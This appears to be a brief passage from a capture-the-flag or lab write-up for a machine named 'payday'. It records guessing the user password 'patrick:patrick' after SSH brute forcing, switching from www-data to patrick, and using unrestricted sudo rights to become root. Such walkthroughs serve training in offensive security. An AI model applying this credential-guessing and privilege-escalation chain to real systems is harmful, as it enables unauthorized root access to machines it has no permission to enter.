# 6 patrick > privesc > root

```
Nothing is on there, brute forcing ssh

# password for patrick:patrick

www-data@payday:/var/www/var/skins_repository$ su patrick
# patrick
patrick@payday:/var/www/var/skins_repository$ sudo -l
User patrick may run the following commands on this host:
    (ALL) ALL
patrick@payday:/var/www/var/skins_repository$ sudo su
root@payday:/var/www/var/skins_repository# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```
